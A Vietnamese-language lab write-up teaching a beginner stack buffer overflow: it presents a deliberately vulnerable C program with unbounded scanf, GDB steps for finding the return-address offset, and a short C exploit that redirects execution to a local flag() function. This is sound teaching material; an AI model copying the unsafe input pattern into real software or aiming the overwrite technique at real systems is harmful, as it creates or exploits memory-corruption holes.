<div align="center">

#  Buffer Overflow Exploitation
### WriteUp: Khai thác BOF bằng C script — không dùng pwntools

![Platform](https://img.shields.io/badge/Platform-Linux%20x64-informational?style=flat-square&logo=linux&logoColor=white&color=0a0a0a)
![Language](https://img.shields.io/badge/Language-C-blue?style=flat-square&logo=c)
![Category](https://img.shields.io/badge/Category-Binary%20Exploitation-critical?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%20Friendly-success?style=flat-square)

</div>

---

##  Mục lục

- [BOF là gì?](#-i-bof-là-gì)
- [Tại sao ghi đè RBP lại crash?](#-i1-tại-sao-ghi-đè-rbp-lại-crash)
- [Cách tính offset](#-ii-cách-tính-offset)
- [Khai thác — exploit script](#-iii-khai-thác)

---

##  I. BOF là gì?

**Buffer Overflow (BOF)** là lỗ hổng cho phép ghi dữ liệu vượt ra ngoài vùng nhớ đã cấp phát trên stack. Khi dữ liệu tràn đến `RIP/RBP`, kẻ tấn công có thể điều hướng luồng thực thi đến bất kỳ địa chỉ nào mong muốn.

### Code có lỗ hổng

```c
#include <stdio.h>
#include <string.h>

void flag() {
    printf("FLAGGGGGGGGGGG1234567890000000000000\n");
}

void vulnerable() {
    char buf[64];

    printf("Input: ");
    scanf("%s", &buf);   //  Không giới hạn độ dài — cực kỳ nguy hiểm!

    printf("You entered: %s\n", buf);
}

int main() {
    vulnerable();
    return 0;
}
```

> **Mục tiêu:** Gọi được hàm `flag()` mà không thông qua luồng thực thi bình thường.

### Tạo chuỗi cyclic và gây crash

Mở binary trong GDB rồi chạy với chuỗi cyclic 300 ký tự:

```bash
gdb ./bof
(gdb) r <<< $(pwn cyclic 300)
```

> `pwn cyclic 300` sinh ra 300 ký tự **không lặp lại**, giúp ta xác định chính xác vị trí bị ghi đè.

Kết quả: chương trình crash với `SIGSEGV` vì đã tràn ra ngoài vùng `buf[64]` và ghi đè các giá trị quan trọng trên stack.

```
Program received signal SIGSEGV, Segmentation fault.
RBP: 0x6161617261616171  ← bị ghi đè bởi chuỗi cyclic
```

![crash screenshot](image3.png)

---

##  I.1. Tại sao ghi đè RBP lại crash?

Lỗi xảy ra tại lệnh `ret` ở cuối hàm `vulnerable()`.

```
 ┌────────────────────────────────────────────────────────┐
 │  ret  ──> đọc giá trị từ [RSP] và nhảy đến đó          │
 │           nếu giá trị đó không hợp lệ → SIGSEGV        │
 └────────────────────────────────────────────────────────┘
```

**Luồng chi tiết:**

1. `scanf` ghi vượt qua `buf[64]`, tràn vào `RBP` và `return address`
2. Hàm `vulnerable` kết thúc → thực thi lệnh `ret`
3. `ret` lấy địa chỉ trên stack (đã bị ghi đè bởi ký tự cyclic) và cố nhảy đến đó
4. Địa chỉ đó không hợp lệ → kernel phát sinh `SIGSEGV`

![ret crash](image4.png)

---

##  II. Cách tính offset

Vì `RIP` chưa bị ghi đè trực tiếp trong ví dụ này, ta tính offset qua `RBP`:

```bash
(gdb) cyclic -l 0x6161617261616171
```

```
Found at offset 64
```

![offset](image6.png)

### Stack layout


┌───────────────────────────────┐  ← địa chỉ thấp
│  buf[64]  (local variable)    │
├───────────────────────────────┤
│  padding / saved registers    │
├───────────────────────────────┤  ← RBP  (offset = 64)
│  Saved Base Pointer (RBP)     │
├───────────────────────────────┤  ← RBP + 8
│  Return Address  < mục tiêu > │  ← offset = 72
└───────────────────────────────┘  ← địa chỉ cao


> **Công thức:** `offset_RBP + 8 = 64 + 8 = 72` → đây là offset chính xác để ghi đè return address.

---

##  III. Khai thác

### Lấy địa chỉ hàm `flag()`

```bash
(gdb) disas flag
```

```
Dump of assembler code for function flag:
   0x0000555555555159 <+0>:  push rbp       ← đây là địa chỉ cần lấy
   ...
```

![disas flag](image7.png)

### Exploit script (C)

```c
#include <unistd.h>
#include <stdint.h>
#include <string.h>

int main(void) {
    // ── Cấu hình ────────────────────────────────────────────
    int      offset = 72;                    // offset đến return address
    uint64_t win    = 0x0000555555555159;    // địa chỉ hàm flag()
    // ────────────────────────────────────────────────────────

    char payload[800];

    memset(payload, 'A', offset);            // lấp đầy buffer + padding
    memcpy(payload + offset, &win, 8);       // ghi đè return address
    //                               ^── 8 bytes cho binary x64 (dùng 4 cho x86)

    int payload_len = offset + 8;

    write(1, payload, payload_len);          // ghi ra stdout
    return 0;
}
```

> **Lưu ý:** Với binary **x86** (32-bit), thay `uint64_t` → `uint32_t` và đổi `8` → `4`.

### Biên dịch và chạy

```bash
# Biên dịch exploit
gcc exploit.c -o exploit

# Chạy trong GDB
(gdb) r <<< $(./exploit)
```

![compile](image8.png)
![pwned](image9.png)

---

##  Kết quả

```
FLAGGGGGGGGGGG1234567890000000000000
```

Hàm `flag()` đã được gọi thành công thông qua khai thác BOF 

---

##  Tóm tắt luồng tấn công

```
Input dài  →  tràn buf[64]  →  ghi đè RBP  →  ghi đè Return Address
                                                       │
                                                       ▼
                                              ret nhảy đến flag()
                                                       │
                                                       ▼
                                              FLAG in ra màn hình 
```

---

<div align="center">

được tạo bởi `Trần Quang Hào` **Chỉ dành cho mục đích học tập và thực hành trong lab cho phép**

</div>
